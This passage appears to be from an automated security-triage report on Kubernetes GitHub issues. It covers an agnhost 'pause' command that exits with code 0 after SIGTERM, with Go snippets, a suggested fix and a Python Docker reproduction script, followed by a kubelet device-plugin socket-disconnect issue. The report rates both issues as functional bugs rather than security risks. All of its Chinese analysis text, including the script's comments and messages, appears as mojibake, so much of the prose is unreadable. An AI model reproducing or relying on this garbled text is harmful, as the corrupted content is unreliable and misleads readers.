                        fmt.Println("received SIGTERM")
                        done <- 2
                        time.Sleep(time.Minute)
                        os.Exit(2)
                }
        }()
        result := <-done
        fmt.Printf("exiting %d\n", result)
}
```
Such an image is here: https://hub.docker.com/repository/docker/mszadkow256/moje/tags/2.53-sleep-pause/sha2[â€¦]de7b47e396a90e6ed9eaf66b0e3a66d6378211327fd18cbfd9deb090db06a

2. Run it `docker run --rm mszadkow256/moje:2.53-sleep-pause pause`
3. In another console send SIGTERM: `docker exec 60a273597124 kill 1` 
Issue: The pause command exists with 0 (check with `echo $?`



#### Anything else we need to know?

This caused flakes in Kueue tests which was assuming the exit code is always a failure: https://github.com/kubernetes-sigs/kueue/issues/4733

I think the intention of the code is 

```golang
func pause(cmd *cobra.Command, args []string) {
        fmt.Println("Paused")
        sigCh := make(chan os.Signal, 1)
        done := make(chan int, 1)
        signal.Notify(sigCh, syscall.SIGINT)
        signal.Notify(sigCh, syscall.SIGTERM)
        fmt.Println("Signals registered")
        go func() {
                sig := <-sigCh
                switch sig {
                case syscall.SIGINT:
                        done <- 1
                case syscall.SIGTERM:
                        done <- 2
                }
        }()
        result := <-done
        fmt.Printf("exiting %d\n", result)
        os.Exit(result)
}
```

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
1.  **Issue æœ¬è´¨åˆ†æ**: è¯¥ Issue æŒ‡å‡º Kubernetes æµ‹è¯•å·¥å…· `agnhost` ä¸­çš„ `pause` å‘½ä»¤åœ¨æ¥æ”¶åˆ° SIGINT æˆ– SIGTERM ä¿¡å·æ—¶ï¼Œå­˜åœ¨å¶ç„¶ä»¥é€€å‡ºç  0 é€€å‡ºçš„æƒ…å†µã€‚æ ¹æ® Issue æè¿°å’Œæä¾›çš„ Go ä»£ç ç‰‡æ®µï¼Œæ ¹æœ¬åŸå› æ˜¯ Go åç¨‹ï¼ˆgoroutineï¼‰åœ¨å¤„ç†ä¿¡å·åï¼Œè™½ç„¶é€šè¿‡ channel (`done`) å°†é¢„æœŸçš„é€€å‡ºç ï¼ˆ1 æˆ– 2ï¼‰å‘é€ç»™äº†ä¸»çº¿ç¨‹ï¼Œä½†ä¸»çº¿ç¨‹åœ¨æ¥æ”¶åˆ°è¯¥å€¼ã€æ‰“å°åå°±æ­£å¸¸ç»“æŸäº†ï¼Œå¯¼è‡´è¿›ç¨‹çš„æœ€ç»ˆé€€å‡ºç ä¸ºéšå¼çš„ 0ã€‚è€Œåœ¨åç¨‹å†…éƒ¨è°ƒç”¨çš„ `os.Exit(result)`ï¼ˆåœ¨åŸå§‹ä»£ç æˆ–ä¿®æ”¹åçš„ä»£ç ä¸­ï¼Œå°¤å…¶æ˜¯åœ¨`time.Sleep`ä¹‹åï¼‰å‘ç”Ÿåœ¨ä¸»çº¿ç¨‹é€€å‡ºä¹‹åæˆ–å‡ ä¹åŒæ—¶ï¼Œæ— æ³•å½±å“ä¸»è¿›ç¨‹æœ€ç»ˆçš„é€€å‡ºçŠ¶æ€ç ã€‚Issue æäº¤è€…æä¾›çš„å¤ç°æ­¥éª¤é€šè¿‡åœ¨ä¿¡å·å¤„ç†åç¨‹ä¸­åŠ å…¥ `time.Sleep` å¼ºåˆ¶å»¶è¿Ÿ `os.Exit` çš„è°ƒç”¨ï¼Œä½¿å¾—ä¸»çº¿ç¨‹å‡ ä¹æ€»æ˜¯åœ¨ `os.Exit` è°ƒç”¨å‰é€€å‡ºï¼Œä»è€Œç¨³å®šå¤ç°é€€å‡ºç ä¸º 0 çš„æƒ…å†µã€‚
2.  **å½±å“åˆ†æ**: `agnhost` æ˜¯ä¸€ä¸ªç”¨äº Kubernetes ç«¯åˆ°ç«¯ï¼ˆe2eï¼‰æµ‹è¯•çš„é•œåƒï¼Œæä¾›äº†å¤šç§è¾…åŠ©åŠŸèƒ½ã€‚`pause` å‘½ä»¤é€šå¸¸ç”¨äºä¿æŒ Pod è¿è¡Œï¼ˆç±»ä¼¼åŸºç¡€é•œåƒçš„ `pause`ï¼‰æˆ–æµ‹è¯•ä¿¡å·å¤„ç†ã€‚æ­¤ Issue æè¿°çš„ bug å¯¼è‡´ `pause` å‘½ä»¤çš„é€€å‡ºç è¡Œä¸ºä¸ç¬¦åˆé¢„æœŸã€‚ç›´æ¥å½±å“æ˜¯åœ¨ä¾èµ–æ­¤é€€å‡ºç è¿›è¡Œåˆ¤æ–­çš„æµ‹è¯•åœºæ™¯ä¸­ï¼ˆå¦‚ Issue ä¸­æåˆ°çš„ Kueue æµ‹è¯•ï¼‰ä¼šå¯¼è‡´æµ‹è¯•ç”¨ä¾‹å˜å¾—ä¸ç¨³å®šï¼ˆflakyï¼‰ã€‚
3.  **å®‰å…¨é£é™©è¯„ä¼°**:
    *   **æ¼æ´ç±»å‹**: è¿™æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªåŠŸèƒ½æ€§ Bugï¼Œæ˜¯ç¨‹åºé€»è¾‘é”™è¯¯å¯¼è‡´çš„è¡Œä¸ºä¸ç¬¦åˆé¢„æœŸï¼Œè€Œéå…¸å‹çš„å®‰å…¨æ¼æ´ï¼ˆå¦‚ RCE, SQLi, XSS, æƒé™æå‡ç­‰ï¼‰ã€‚
    *   **åˆ©ç”¨æ¡ä»¶**: è¦è§¦å‘è¿™ä¸ª bug å¹¶è§‚å¯Ÿåˆ°é”™è¯¯çš„é€€å‡ºç ï¼Œéœ€è¦èƒ½å¤Ÿå‘è¿è¡Œ `agnhost pause` çš„å®¹å™¨å†…çš„è¿›ç¨‹å‘é€ä¿¡å·ï¼ˆå¦‚ SIGTERMï¼‰ã€‚åœ¨ Kubernetes ç¯å¢ƒä¸­ï¼Œè¿™é€šå¸¸éœ€è¦å…·æœ‰ `exec` åˆ° Pod æˆ–ç›´æ¥æ“ä½œ Docker/containerd å®ˆæŠ¤è¿›ç¨‹çš„æƒé™ã€‚æ”»å‡»è€…å¦‚æœå·²ç»æ‹¥æœ‰è¿™äº›æƒé™ï¼Œä»–ä»¬é€šå¸¸å·²ç»å¯ä»¥æ‰§è¡Œæ›´é«˜æƒé™çš„æ“ä½œï¼ˆå¦‚ç›´æ¥åœ¨å®¹å™¨å†…æ‰§è¡Œå‘½ä»¤ã€åœæ­¢å®¹å™¨ç­‰ï¼‰ã€‚
    *   **æ½œåœ¨å½±å“**: é”™è¯¯çš„é€€å‡ºç æœ¬èº«å¹¶ä¸ä¼šç›´æ¥å¯¼è‡´ä¿¡æ¯æ³„éœ²ã€æƒé™æå‡ã€è¿œç¨‹ä»£ç æ‰§è¡Œæˆ–æ‹’ç»æœåŠ¡ï¼ˆè¿›ç¨‹ç¡®å®é€€å‡ºäº†ï¼Œåªæ˜¯çŠ¶æ€ç ä¸å¯¹ï¼‰ã€‚å®ƒå¯èƒ½å½±å“ä¾èµ–æ­¤é€€å‡ºç çš„è‡ªåŠ¨åŒ–æµç¨‹æˆ–æµ‹è¯•çš„æ­£ç¡®æ€§ã€‚åœ¨ç”Ÿäº§ç¯å¢ƒä¸­ä½¿ç”¨ `agnhost` æœ¬èº«å°±ä¸å¸¸è§ä¸”ä¸æ¨èï¼Œå…¶ä¸»è¦è®¾è®¡ç›®çš„æ˜¯æµ‹è¯•ã€‚å³ä½¿åœ¨æµ‹è¯•ç¯å¢ƒä¸­ï¼Œå…¶å½±å“ä¹Ÿå±€é™äºæµ‹è¯•ç»“æœçš„å‡†ç¡®æ€§/ç¨³å®šæ€§ã€‚
    *   **ä¾æ®è§„åˆ™åˆ¤æ–­**:
        *   è§„åˆ™ 2: è¯¥é—®é¢˜éå®‰å…¨é—®é¢˜ï¼Œæ˜¯åŠŸèƒ½æ€§ bugã€‚
        *   è§„åˆ™ 5: å³ä½¿è§†ä¸ºæŸç§å½¢å¼çš„â€œè¡Œä¸ºå¼‚å¸¸â€ï¼Œè§¦å‘å®ƒä¹Ÿéœ€è¦æ‰§è¡Œæ“ä½œï¼ˆå‘é€ä¿¡å·ï¼‰çš„æƒé™ï¼Œä¸å±äºæ— æƒé™æˆ–ä½æƒé™æ”»å‡»ã€‚
        *   è§„åˆ™ 7 & 8: ä¸æ¶‰åŠå‘½ä»¤æ‰§è¡Œã€ææƒã€å®¹å™¨é€ƒé€¸æˆ–å½±å“å…¶ä»–ç§Ÿæˆ·ã€‚
    *   **ç»“è®º**: è¯¥ Issue æè¿°çš„é—®é¢˜æ˜¯ä¸€ä¸ªåŠŸèƒ½æ€§ Bugï¼Œä¸æ„æˆå®‰å…¨é£é™©ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
# è¯¥è„šæœ¬æ—¨åœ¨å¤ç° Issue ä¸­æè¿°çš„ agnhost pause å‘½ä»¤åœ¨æ¥æ”¶ SIGTERM å
# ä»¥é€€å‡ºç  0 é€€å‡ºçš„ Bugï¼Œè€Œéå®‰å…¨æ¼æ´åˆ©ç”¨ã€‚
# è„šæœ¬ä¾èµ– docker SDK for Python (pip install docker)
# å¹¶ä¸”éœ€è¦æœ¬åœ° Docker ç¯å¢ƒæ­£åœ¨è¿è¡Œä¸”æœ‰æƒé™æ“ä½œã€‚

import docker
import time
import sys

# ä½¿ç”¨ Issue ä¸­æä¾›çš„ç‰¹å®šé•œåƒï¼Œè¯¥é•œåƒå·²ä¿®æ”¹ä»¥æ›´å®¹æ˜“å¤ç°é—®é¢˜
IMAGE_NAME = "mszadkow256/moje:2.53-sleep-pause"
# Docker Hub ä¸Šçš„ SHA æŒ‡å‘: 
# sha256:369de7b47e396a90e6ed9eaf66b0e3a66d6378211327fd18cbfd9deb090db06a
# å¦‚æœéœ€è¦ï¼Œå¯ä»¥ä½¿ç”¨å®Œæ•´çš„ digest: mszadkow256/moje@sha256:369de7b47e396a90e6ed9eaf66b0e3a66d6378211327fd18cbfd9deb090db06a

def main():
    """
    ä¸»å‡½æ•°ï¼Œæ‰§è¡Œå¤ç°æ­¥éª¤ã€‚
    """
    container = None
    client = None
    try:
        client = docker.from_env()
        print(f"[*] æ­£åœ¨å°è¯•æ‹‰å–é•œåƒ: {IMAGE_NAME}")
        try:
            client.images.pull(IMAGE_NAME)
            print(f"[+] é•œåƒæ‹‰å–æˆåŠŸ: {IMAGE_NAME}")
        except docker.errors.ImageNotFound:
            print(f"[!] é”™è¯¯: é•œåƒ {IMAGE_NAME} æœªæ‰¾åˆ°ã€‚è¯·ç¡®ä¿é•œåƒåç§°å’Œæ ‡ç­¾æ­£ç¡®ã€‚")
            sys.exit(1)
        except docker.errors.APIError as e:
            print(f"[!] æ‹‰å–é•œåƒæ—¶å‘ç”Ÿ Docker API é”™è¯¯: {e}")
            sys.exit(1)

        print("[*] æ­£åœ¨ä»¥åå°æ¨¡å¼å¯åŠ¨å®¹å™¨...")
        # ä½¿ç”¨ detach=True åœ¨åå°è¿è¡Œï¼Œ auto_remove=False ä»¥ä¾¿åç»­è·å–é€€å‡ºç 
        container = client.containers.run(
            IMAGE_NAME,
            command="pause",
            detach=True,
            auto_remove=False # è®¾ç½®ä¸º False ä»¥ä¾¿æ£€æŸ¥é€€å‡ºçŠ¶æ€
        )
        print(f"[+] å®¹å™¨å·²å¯åŠ¨ï¼ŒID: {container.id[:12]}")

        # ç­‰å¾…å®¹å™¨å†… pause è¿›ç¨‹å¯åŠ¨å¹¶æ³¨å†Œä¿¡å·å¤„ç†å™¨
        print("[*] ç­‰å¾… 3 ç§’è®©å®¹å™¨å†…è¿›ç¨‹ç¨³å®š...")
        time.sleep(3)

        # å‘å®¹å™¨å†…çš„ PID 1 å‘é€ SIGTERM ä¿¡å· (agnhost pause é€šå¸¸æ˜¯ PID 1)
        print("[*] æ­£åœ¨å‘å®¹å™¨å†…çš„ PID 1 å‘é€ SIGTERM ä¿¡å·...")
        # æ³¨æ„ï¼šè¿™é‡Œçš„ 'kill 1' æ˜¯åœ¨å®¹å™¨å†…éƒ¨æ‰§è¡Œçš„å‘½ä»¤
        exec_result = container.exec_run("kill -TERM 1")
        if exec_result.exit_code != 0:
            print(f"[!] åœ¨å®¹å™¨å†…æ‰§è¡Œ kill å‘½ä»¤å¤±è´¥ï¼Œé€€å‡ºç : {exec_result.exit_code}")
            print(f"    è¾“å‡º: {exec_result.output.decode('utf-8', errors='ignore')}")
            # å³ä½¿ kill å¤±è´¥ï¼Œä¹Ÿç»§ç»­å°è¯•è·å–å®¹å™¨é€€å‡ºçŠ¶æ€
        else:
            print("[+] SIGTERM ä¿¡å·å·²å‘é€ã€‚")

        # ç­‰å¾…å®¹å™¨é€€å‡ºï¼Œè®¾ç½®è¶…æ—¶æ—¶é—´
        print("[*] ç­‰å¾…å®¹å™¨é€€å‡º (æœ€å¤šç­‰å¾… 60 ç§’)...")
        try:
            # wait() è¿”å›ä¸€ä¸ªåŒ…å« 'StatusCode' çš„å­—å…¸
            result = container.wait(timeout=60)
            exit_code = result.get('StatusCode', None)
            print(f"[+] å®¹å™¨å·²é€€å‡ºã€‚")
            if exit_code == 0:
                print(f"[âœ“] å¤ç°æˆåŠŸ: å®¹å™¨é€€å‡ºç ä¸º {exit_code}ï¼Œç¬¦åˆ Issue æè¿°çš„ Bug è¡Œä¸ºã€‚")
                print("    é¢„æœŸè¡Œä¸ºï¼ˆæ ¹æ®ä¿®å¤å»ºè®®ï¼‰ï¼šå¯¹äº SIGTERMï¼Œé€€å‡ºç åº”ä¸º 2ã€‚")
            elif exit_code is not None:
                print(f"[?] å®¹å™¨é€€å‡ºç ä¸º {exit_code}ï¼Œä¸ Issue ä¸­æè¿°çš„ä¸»è¦ç°è±¡ (é€€å‡ºç  0) ä¸ç¬¦ï¼Œä½†è¿™ä»å¯èƒ½æ˜¯ç«æ€æ¡ä»¶çš„ä¸åŒç»“æœã€‚")
            else:
                 print(f"[!] æœªèƒ½è·å–åˆ°æ˜ç¡®çš„é€€å‡ºç : {result}")

        except Exception as e:
            # è¶…æ—¶æˆ–å…¶ä»–ç­‰å¾…é”™è¯¯
            print(f"[!] ç­‰å¾…å®¹å™¨é€€å‡ºæ—¶å‘ç”Ÿé”™è¯¯: {e}")
            print("[*] å°è¯•å¼ºåˆ¶åœæ­¢å®¹å™¨...")
            try:
                container.stop(timeout=5)
            except Exception as stop_err:
                print(f"[!] å¼ºåˆ¶åœæ­¢å®¹å™¨æ—¶å‡ºé”™: {stop_err}")

    except docker.errors.NotFound:
        print(f"[!] é”™è¯¯: å®¹å™¨ {container.id[:12] if container else 'æœªçŸ¥'} ä¼¼ä¹åœ¨æ“ä½œè¿‡ç¨‹ä¸­æ„å¤–æ¶ˆå¤±äº†ã€‚")
    except docker.errors.APIError as e:
        print(f"[!] Docker API é”™è¯¯: {e}")
        print("    è¯·ç¡®ä¿ Docker å®ˆæŠ¤è¿›ç¨‹æ­£åœ¨è¿è¡Œä¸”å½“å‰ç”¨æˆ·æœ‰æƒé™è®¿é—®ã€‚")
    except Exception as e:
        print(f"[!] å‘ç”Ÿæ„å¤–é”™è¯¯: {e}")
    finally:
        if container:
            print("[*] æ¸…ç†å®¹å™¨...")
            try:
                # ç¡®ä¿å®¹å™¨åœæ­¢å¹¶ç§»é™¤
                container.reload() # è·å–æœ€æ–°çŠ¶æ€
                if container.status not in ["removing", "exited", "dead"]:
                    container.stop(timeout=10)
                container.remove(force=True) # ä½¿ç”¨ force=True ç¡®ä¿ç§»é™¤
                print(f"[+] å®¹å™¨ {container.id[:12]} å·²æ¸…ç†ã€‚")
            except docker.errors.NotFound:
                 print(f"[*] å®¹å™¨ {container.id[:12]} å·²ç»è¢«ç§»é™¤ã€‚")
            except Exception as cleanup_err:
                print(f"[!] æ¸…ç†å®¹å™¨ {container.id[:12]} æ—¶å‡ºé”™: {cleanup_err}")

# ç›´æ¥æ‰§è¡Œ main å‡½æ•° (æ ¹æ®è¦æ±‚ï¼Œä¸ä½¿ç”¨ if __name__ == "__main__":)
main()
```


**è§£é‡Šè¯´æ˜ï¼š**

è¯¥ Python è„šæœ¬ä½¿ç”¨ `docker` Python åº“æ¥è‡ªåŠ¨åŒ–å¤ç° Issue ä¸­æè¿°çš„ `agnhost pause` å‘½ä»¤çš„ Bugã€‚

1.  **ç¯å¢ƒå‡†å¤‡**: è„šæœ¬é¦–å…ˆåˆå§‹åŒ– Docker å®¢æˆ·ç«¯ï¼Œå¹¶å°è¯•æ‹‰å– Issue ä¸­æŒ‡å®šçš„ã€åŒ…å«ä¿®æ”¹åä»£ç ä»¥æ›´å®¹æ˜“è§¦å‘ Bug çš„ Docker é•œåƒ (`mszadkow256/moje:2.53-sleep-pause`)ã€‚
2.  **è¿è¡Œå®¹å™¨**: è„šæœ¬åœ¨åå°å¯åŠ¨ä¸€ä¸ªåŸºäºè¯¥é•œåƒçš„å®¹å™¨ï¼Œå¹¶æ‰§è¡Œ `pause` å‘½ä»¤ã€‚`auto_remove=False` ç¡®ä¿å®¹å™¨é€€å‡ºåä¸ä¼šç«‹å³è¢«åˆ é™¤ï¼Œä»¥ä¾¿æˆ‘ä»¬èƒ½æ£€æŸ¥å…¶é€€å‡ºç ã€‚
3.  **è§¦å‘æ¡ä»¶**: è„šæœ¬ç­‰å¾…çŸ­æš‚æ—¶é—´ï¼ˆ3 ç§’ï¼‰ä»¥ç¡®ä¿å®¹å™¨å†…çš„ `pause` è¿›ç¨‹å·²å¯åŠ¨å¹¶è®¾ç½®å¥½ä¿¡å·å¤„ç†ã€‚ç„¶åï¼Œå®ƒä½¿ç”¨ `container.exec_run("kill -TERM 1")` å‘½ä»¤åœ¨è¿è¡Œçš„å®¹å™¨å†…éƒ¨å‘è¿›ç¨‹ ID ä¸º 1ï¼ˆé€šå¸¸æ˜¯ `agnhost pause` è¿›ç¨‹ï¼‰å‘é€ SIGTERM ä¿¡å·ã€‚
4.  **ç»“æœéªŒè¯**: è„šæœ¬æ¥ç€è°ƒç”¨ `container.wait()` ç­‰å¾…å®¹å™¨è¿›ç¨‹è‡ªç„¶é€€å‡ºï¼Œå¹¶è·å–å…¶æœ€ç»ˆçš„é€€å‡ºçŠ¶æ€ç ã€‚
5.  **è¾“å‡ºåˆ¤æ–­**: è„šæœ¬æ‰“å°è·å–åˆ°çš„é€€å‡ºç ã€‚å¦‚æœé€€å‡ºç ä¸º 0ï¼Œåˆ™è¡¨ç¤ºæˆåŠŸå¤ç°äº† Issue ä¸­æè¿°çš„ Bugï¼ˆå³æ”¶åˆ° SIGTERM åé”™è¯¯åœ°ä»¥ 0 é€€å‡ºï¼‰ã€‚è„šæœ¬åŒæ—¶ä¼šæŒ‡å‡ºé¢„æœŸçš„æ­£ç¡®è¡Œä¸ºï¼ˆæ ¹æ® Issue ä¿®å¤å»ºè®®ï¼Œæ”¶åˆ° SIGTERM åº”ä»¥é€€å‡ºç  2 é€€å‡ºï¼‰ã€‚
6.  **æ¸…ç†**: æ— è®ºæˆåŠŸä¸å¦ï¼Œè„šæœ¬æœ€åéƒ½ä¼šå°è¯•åœæ­¢å¹¶ç§»é™¤åˆ›å»ºçš„å®¹å™¨ï¼Œä»¥æ¸…ç†ç¯å¢ƒã€‚
7.  **é”™è¯¯å¤„ç†ä¸è¶…æ—¶**: è„šæœ¬åŒ…å«äº†å¯¹ Docker API é”™è¯¯ã€é•œåƒæœªæ‰¾åˆ°ã€å®¹å™¨æ“ä½œé”™è¯¯ç­‰çš„å¼‚å¸¸å¤„ç†ï¼Œå¹¶ä¸ºå®¹å™¨ç­‰å¾…æ“ä½œè®¾ç½®äº†è¶…æ—¶æ—¶é—´ï¼ˆ60 ç§’ï¼‰ï¼Œé˜²æ­¢è„šæœ¬æ— é™æœŸæŒ‚èµ·ã€‚

**é‡è¦æç¤º**: æ­¤è„šæœ¬ä»…ç”¨äºæ¼”ç¤ºå’ŒéªŒè¯ Issue ä¸­æè¿°çš„ `agnhost` å·¥å…·çš„åŠŸèƒ½æ€§ Bugï¼Œç¡®è®¤å…¶é€€å‡ºç è¡Œä¸ºä¸é¢„æœŸä¸ç¬¦ã€‚å®ƒæœ¬èº«å¹¶ä¸åˆ©ç”¨ä»»ä½•å®‰å…¨æ¼æ´ã€‚æ‰§è¡Œæ­¤è„šæœ¬éœ€è¦æœ¬åœ°å®‰è£…å¹¶è¿è¡Œ Dockerï¼Œå¹¶ä¸”æ‰§è¡Œç”¨æˆ·éœ€è¦æœ‰ç›¸åº”çš„ Docker æ“ä½œæƒé™ã€‚

---


## Issue #131013 The Unix domain socket EOF between kubelet and device plugin is disconnected. Currently, kubelet does not have the retry mechanism

- Issue é“¾æ¥ï¼š[#131013](https://github.com/kubernetes/kubernetes/issues/131013)

### Issue å†…å®¹

#### What happened?

The Unix domain socket EOF between kubelet and device plugin is disconnected. Currently, kubelet does not have the retry mechanism.

#### What did you expect to happen?

kubelet can retry to connect device plugin when kubelet and device plugin is disconnected

#### How can we reproduce it (as minimally and precisely as possible)?

1. create pod using multi gpu
2. in container, run the task
3. after a long time, the link is broken

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥ Issue æè¿°äº† Kubernetes çš„ `kubelet` ç»„ä»¶ä¸å…¶ç®¡ç†çš„è®¾å¤‡æ’ä»¶ï¼ˆDevice Pluginï¼‰ä¹‹é—´çš„ Unix åŸŸå¥—æ¥å­—ï¼ˆUnix Domain Socket, UDSï¼‰è¿æ¥åœ¨æŸäº›æƒ…å†µä¸‹ï¼ˆä¾‹å¦‚é•¿æ—¶é—´è¿è¡Œåï¼‰ä¼šæ–­å¼€ï¼ˆEOFï¼‰ï¼Œå¹¶ä¸” `kubelet` å½“å‰æ²¡æœ‰è‡ªåŠ¨é‡è¯•è¿æ¥çš„æœºåˆ¶ã€‚

1.  **é—®é¢˜æ€§è´¨**ï¼šè¿™æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ª**å¯é æ€§ï¼ˆReliabilityï¼‰**å’Œ**å¯ç”¨æ€§ï¼ˆAvailabilityï¼‰**é—®é¢˜ã€‚å½“ `kubelet` ä¸è®¾å¤‡æ’ä»¶çš„ UDS è¿æ¥æ–­å¼€åï¼Œ`kubelet` æ— æ³•å†é€šè¿‡è¯¥æ’ä»¶è·å–å’Œåˆ†é…ç‰¹å®šçš„ç¡¬ä»¶èµ„æºï¼ˆå¦‚ Issue ä¸­æåˆ°çš„ GPUï¼‰ã€‚è¿™ä¼šå¯¼è‡´éœ€è¦è¿™äº›ç‰¹å®šèµ„æºçš„æ–° Pod æ— æ³•è¢«è°ƒåº¦åˆ°è¯¥èŠ‚ç‚¹ï¼Œæˆ–è€…æ­£åœ¨è¿è¡Œçš„ Pod å¦‚æœéœ€è¦é‡æ–°ä¸è®¾å¤‡æ’ä»¶äº¤äº’ï¼ˆè™½ç„¶ä¸å¸¸è§ï¼Œä½†å–å†³äºæ’ä»¶å®ç°ï¼‰ï¼Œå¯èƒ½ä¼šé‡åˆ°é—®é¢˜ã€‚
2.  **æ½œåœ¨å½±å“**ï¼šä¸»è¦å½±å“æ˜¯èŠ‚ç‚¹ä¸Šçš„ç‰¹å®šè®¾å¤‡èµ„æºï¼ˆå¦‚ GPUï¼‰å˜å¾—ä¸å¯ç”¨ï¼Œä¾èµ–è¿™äº›èµ„æºçš„ Pod æ— æ³•åœ¨è¯¥èŠ‚ç‚¹ä¸Šå¯åŠ¨æˆ–è¿è¡Œã€‚è¿™æ˜¯ä¸€ç§**æ‹’ç»æœåŠ¡ï¼ˆDenial of Service, DoSï¼‰**ï¼Œä½†å½±å“èŒƒå›´å±€é™äºå•ä¸ªèŠ‚ç‚¹ä¸Šçš„ç‰¹å®šç±»å‹è®¾å¤‡ã€‚
3.  **å®‰å…¨é£é™©è¯„ä¼°**ï¼š
    *   **è§¦å‘æ¡ä»¶**ï¼šIssue ä¸­æè¿°çš„è§¦å‘æ¡ä»¶æ˜¯â€œé•¿æ—¶é—´è¿è¡Œåâ€ï¼Œè¿™è¡¨æ˜è¿™æ›´å¯èƒ½æ˜¯ä¸€ä¸ªç¨³å®šæ€§é—®é¢˜æˆ–èµ„æºè€—å°½/ç®¡ç†ä¸å½“å¯¼è‡´è¿æ¥ä¸­æ–­ï¼Œè€Œä¸æ˜¯ç”±å¤–éƒ¨æ”»å‡»è€…ä¸»åŠ¨å‘èµ·çš„æ”»å‡»ã€‚æ²¡æœ‰ä¿¡æ¯è¡¨æ˜æ”»å‡»è€…å¯ä»¥è½»æ˜“åœ°ã€è¿œç¨‹åœ°æˆ–ä»¥ä½æƒé™ç”¨æˆ·çš„èº«ä»½è§¦å‘è¿™ä¸ª UDS è¿æ¥æ–­å¼€ã€‚é€šå¸¸ï¼Œè¦å½±å“èŠ‚ç‚¹ä¸Šçš„ UDSï¼Œéœ€è¦è¾ƒé«˜çš„æƒé™ï¼ˆå¦‚ root æƒé™æˆ–å¯¹ç›¸å…³è¿›ç¨‹/æ–‡ä»¶çš„è®¿é—®æƒé™ï¼‰ã€‚
    *   **æ¼æ´ç±»å‹**ï¼šæ ¸å¿ƒé—®é¢˜æ˜¯ç¼ºä¹é‡è¯•æœºåˆ¶ï¼Œè¿™æ˜¯ä¸€ä¸ªåŠŸèƒ½ç¼ºé™·ï¼Œå¯¼è‡´ç³»ç»Ÿåœ¨é‡åˆ°è¿æ¥é—®é¢˜æ—¶ä¸å¤Ÿå¥å£®ã€‚å®ƒæœ¬èº«ä¸æ¶‰åŠä¿¡æ¯æ³„éœ²ã€æƒé™æå‡ã€å‘½ä»¤æ‰§è¡Œç­‰å…¸å‹çš„å®‰å…¨æ¼æ´ã€‚
    *   **DoS é£é™©è¯„ä¼° (ä¾æ®è§„åˆ™ 5)**ï¼šè™½ç„¶è¿™æ˜¯ä¸€ä¸ª DoSï¼Œä½†å®ƒå½±å“çš„æ˜¯èŠ‚ç‚¹ä¸Šçš„è®¾å¤‡å¯ç”¨æ€§ã€‚æ ¹æ® Issue æè¿°ï¼Œæ²¡æœ‰æ˜ç¡®è¯æ®è¡¨æ˜ä½æƒé™ç”¨æˆ·å¯ä»¥è§¦å‘æ­¤é—®é¢˜æ¥å½±å“å…¶ä»–ç”¨æˆ·æˆ–æ•´ä¸ªé›†ç¾¤ã€‚å³ä½¿æ”»å‡»è€…æœ‰æŸç§æ–¹æ³•ï¼ˆæœªåœ¨ Issue ä¸­æè¿°ï¼‰èƒ½å¤Ÿè§¦å‘æ­¤è¿æ¥æ–­å¼€ï¼Œå¦‚æœè¿™éœ€è¦è¾ƒé«˜çš„æƒé™ï¼ˆä¾‹å¦‚èŠ‚ç‚¹è®¿é—®æƒé™ï¼‰ï¼Œæ ¹æ®è§„åˆ™ 5ï¼Œå…¶é£é™©ç­‰çº§ä¹Ÿåº”é™ä½ã€‚é‰´äºç›®å‰ä¿¡æ¯ï¼Œæˆ‘ä»¬å€¾å‘äºè®¤ä¸ºè¿™æ˜¯ä¸€ä¸ªåŠŸèƒ½å’Œå¯é æ€§é—®é¢˜ï¼Œè€Œéå¯è¢«è½»æ˜“åˆ©ç”¨çš„å®‰å…¨æ¼æ´ã€‚
    *   **å…¶ä»–é«˜é£é™©åœºæ™¯ (è§„åˆ™ 7, 8)**ï¼šè¯¥é—®é¢˜ä¸æ¶‰åŠå‘½ä»¤æ‰§è¡Œã€å®¹å™¨é€ƒé€¸ã€ææƒç­‰é«˜é£é™©åœºæ™¯ã€‚å®ƒä¹Ÿä¸å¤ªå¯èƒ½è¢«ä½æƒé™ç”¨æˆ·ç”¨æ¥å½±å“å…¶ä»–ç”¨æˆ·ï¼ˆé™¤éè¯¥ç”¨æˆ·æœ‰ç‰¹å®šæƒé™èƒ½å¹²æ‰°èŠ‚ç‚¹ä¸Šçš„ `kubelet` æˆ–è®¾å¤‡æ’ä»¶è¿›ç¨‹ï¼‰ã€‚

